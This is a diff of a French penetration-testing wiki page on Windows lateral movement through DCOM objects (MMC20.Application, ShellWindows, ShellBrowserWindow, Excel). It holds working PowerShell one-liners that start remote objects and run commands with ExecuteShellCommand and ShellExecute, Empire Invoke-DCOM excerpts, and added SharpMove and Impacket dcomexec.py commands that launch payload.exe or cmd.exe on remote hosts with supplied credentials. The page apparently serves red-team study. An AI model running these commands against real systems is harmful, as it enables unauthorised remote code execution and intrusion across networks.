@@ -13,18 +13,18 @@ Get-CimInstance Win32_DCOMApplication
 L'objet COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scripting des opérations des modules complémentaires MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Vérifiez son fonctionnement :
 
 Cette fonctionnalité facilite l'exécution de commandes sur un réseau via une application DCOM. Pour interagir avec DCOM à distance en tant qu'administrateur, PowerShell peut être utilisé comme suit :
-```powershell
+```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
 Cette commande se connecte à l'application DCOM et renvoie une instance de l'objet COM. La méthode ExecuteShellCommand peut ensuite être invoquée pour exécuter un processus sur l'hôte distant. Le processus implique les étapes suivantes :
 
 Vérifier les méthodes :
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
 Obtenir RCE :
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
 
@@ -38,25 +38,30 @@ ls \\10.10.10.10\c$\Users
 
 L'objet **MMC20.Application** a été identifié comme manquant de "LaunchPermissions" explicites, par défaut aux permissions qui permettent l'accès aux Administrateurs. Pour plus de détails, un fil peut être exploré [ici](https://twitter.com/tiraniddo/status/817532039771525120), et l'utilisation de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET pour filtrer les objets sans permission de lancement explicite est recommandée.
 
-Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en évidence en raison de leur manque de permissions de lancement explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie qu'il n'y a pas de permissions explicites.
+Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en avant en raison de leur absence de permissions de lancement explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie qu'il n'y a pas de permissions explicites.
 
 ### ShellWindows
 
-Pour `ShellWindows`, qui manque d'un ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation de l'objet en utilisant son AppID. Ce processus utilise OleView .NET pour récupérer le CLSID pour `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, conduisant à des invocations de méthodes comme `Document.Application.ShellExecute`.
+Pour `ShellWindows`, qui manque d'un ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation d'objets en utilisant son AppID. Ce processus utilise OleView .NET pour récupérer le CLSID pour `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, conduisant à des invocations de méthodes comme `Document.Application.ShellExecute`.
 
 Des exemples de commandes PowerShell ont été fournis pour instancier l'objet et exécuter des commandes à distance :
-```powershell
+```bash
+# Example
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+
+# Need to upload the file to execute
+$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
+$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
 ```
 ### Mouvement latéral avec des objets DCOM Excel
 
 Le mouvement latéral peut être réalisé en exploitant des objets DCOM Excel. Pour des informations détaillées, il est conseillé de lire la discussion sur l'utilisation d'Excel DDE pour le mouvement latéral via DCOM sur [le blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
 Le projet Empire fournit un script PowerShell, qui démontre l'utilisation d'Excel pour l'exécution de code à distance (RCE) en manipulant des objets DCOM. Ci-dessous se trouvent des extraits du script disponible sur [le dépôt GitHub d'Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), montrant différentes méthodes pour abuser d'Excel pour RCE :
-```powershell
+```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
 $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
@@ -88,12 +93,24 @@ Deux outils sont mis en avant pour automatiser ces techniques :
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
+- [SharpMove](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
+```
 ## Outils Automatiques
 
 - Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permet d'invoquer facilement toutes les méthodes commentées pour exécuter du code sur d'autres machines.
-- Vous pouvez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+- Vous pouvez utiliser `dcomexec.py` d'Impacket pour exécuter des commandes sur des systèmes distants en utilisant DCOM.
+```bash
+dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+```
+- Vous pouvez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral) :
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+```
+- Vous pouvez également utiliser [**SharpMove**](https://github.com/0xthirteen/SharpMove)
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 ## Références
 
